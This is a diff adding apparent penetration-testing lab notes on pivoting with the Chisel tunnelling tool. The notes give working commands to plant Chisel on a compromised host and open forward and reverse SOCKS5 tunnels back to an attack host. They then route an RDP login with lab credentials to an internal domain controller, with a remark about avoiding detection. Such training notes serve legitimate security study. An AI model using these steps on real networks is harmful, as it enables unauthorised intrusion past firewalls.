@@ -952,4 +952,91 @@ Session 1 Security: ENCRYPTED AND VERIFIED!
 ```plaintext
 window -i 1
 ```
+#  SOCKS5 Tunneling with Chisel
+
+**Chisel Overview**: 
+- Chisel is a TCP/UDP tunneling tool written in Go.
+- Uses HTTP for transporting data, secured using SSH.
+- Suitable for creating a client-server tunnel in a restricted environment, like firewalls.
+
+**Scenario**:
+- **Goal**: Tunnel traffic to an internal network (172.16.5.0/23) to access the Domain Controller (DC) at 172.16.5.19.
+- **Challenge**: Attack host and DC are on different network segments.
+- **Solution**: Use a compromised Ubuntu server as a Chisel server to forward traffic to the internal network.
+
+**Steps**:
+
+1. **Cloning Chisel**:
+   - **Command**: `git clone https://github.com/jpillora/chisel.git`
+
+2. **Building the Chisel Binary**:
+   - **Command**: 
+     ```bash
+     cd chisel
+     go build
+     ```
+   - **Note**: You need the Go programming language installed to build the binary.
+
+3. **Transferring Binary to Pivot Host**:
+   - **Command**:
+     ```bash
+     scp chisel ubuntu@10.129.202.64:~/
+     ```
+
+4. **Starting the Chisel Server (Pivot Host)**:
+   - **Command**:
+     ```bash
+     ./chisel server -v -p 1234 --socks5
+     ```
+   - **Function**: Listens on port 1234 and forwards connections to the internal network via SOCKS5.
+
+5. **Connecting the Chisel Client (Attack Host)**:
+   - **Command**:
+     ```bash
+     ./chisel client -v 10.129.202.64:1234 socks
+     ```
+
+6. **Updating proxychains.conf**:
+   - **File location**: `/etc/proxychains.conf`
+   - **Add**: `socks5 127.0.0.1 1080`
+
+7. **Pivoting to DC**:
+   - **Command**:
+     ```bash
+     proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+     ```
+
+### Chisel Reverse Pivot
+
+**Scenario**: Firewall restrictions prevent inbound connections to the compromised machine. Use reverse pivoting to connect.
+
+1. **Starting the Chisel Server (Attack Host)**:
+   - **Command**:
+     ```bash
+     sudo ./chisel server --reverse -v -p 1234 --socks5
+     ```
+   - **Function**: Enables reverse tunneling, listening on port 1234.
+
+2. **Connecting the Chisel Client (Pivot Host)**:
+   - **Command**:
+     ```bash
+     ./chisel client -v 10.10.14.17:1234 R:socks
+     ```
+   - **Function**: Uses `R:socks` to specify reverse proxying via SOCKS5.
+
+3. **Updating proxychains.conf**:
+   - **File location**: `/etc/proxychains.conf`
+   - **Add**: `socks5 127.0.0.1 1080`
+
+4. **Pivoting to DC**:
+   - **Command**:
+     ```bash
+     proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+     ```
+
+**Notes**:
+- **Benefits**: Securely tunneling data through encrypted channels.
+- **Performance & Detection**: Be mindful of file sizes and detection when transferring binaries.
+
+By setting up Chisel this way, you create a secure tunnel that allows you to navigate through network restrictions and reach internal services.
 
